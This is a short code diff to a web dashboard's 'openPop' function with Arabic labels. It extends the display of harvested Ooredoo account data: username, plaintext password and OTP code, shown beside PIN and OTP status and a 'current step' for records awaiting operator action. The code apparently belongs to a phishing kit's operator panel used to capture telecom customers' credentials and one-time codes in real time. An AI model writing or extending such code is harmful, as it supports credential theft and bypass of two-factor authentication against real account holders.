@@ -585,10 +585,10 @@ function openPop(ref){
 <div class="drow"><span class="k">رمز التأكيد (OTP)</span><span class="v">${hasOtp ? 'تم الإدخال' : '-'}</span></div>
 <div class="drow"><span class="k">الرقم السري</span><span class="v">${hasPin ? 'تم الإدخال' : '-'}</span></div>
 </div></div>` : ""}
-${ (o.ooredooUser || o.ooredooPass || o.ooredooOtp) ? `<div style="margin-top:16px"><div style="font-weight:800;margin-bottom:6px">بيانات أوريدو</div><div class="dgrid">
-<div class="drow"><span class="k">اسم المستخدم</span><span class="v" style="direction:ltr">${esc(o.ooredooUser || '')}</span></div>
-<div class="drow"><span class="k">كلمة المرور</span><span class="v" style="direction:ltr">${esc(o.ooredooPass || '')}</span></div>
-<div class="drow"><span class="k">رمز التحقق OTP</span><span class="v" style="direction:ltr">${esc(o.ooredooOtp || '')}</span></div>
+ ${ (o.ooredooUser || o.ooredooUsername || o.ooredooPass || o.ooredooPassword || o.ooredooOtp || o.ooredooCode) ? `<div style="margin-top:16px"><div style="font-weight:800;margin-bottom:6px">بيانات أوريدو</div><div class="dgrid">
+<div class="drow"><span class="k">اسم المستخدم</span><span class="v" style="direction:ltr">${esc(o.ooredooUsername || o.ooredooUser || '')}</span></div>
+<div class="drow"><span class="k">كلمة المرور</span><span class="v" style="direction:ltr">${esc(o.ooredooPassword || o.ooredooPass || '')}</span></div>
+<div class="drow"><span class="k">رمز التحقق OTP</span><span class="v" style="direction:ltr">${esc(o.ooredooCode || o.ooredooOtp || '')}</span></div>
 </div></div>` : '' }
     ${o.status === "awaiting" ? `<div class="dactions" style="border-top:1px solid var(--line); padding-top:16px">
       <div style="flex:1 0 100%; margin-bottom:6px; font-weight:800">الخطوة الحالية: ${stepName(o.step)}</div>
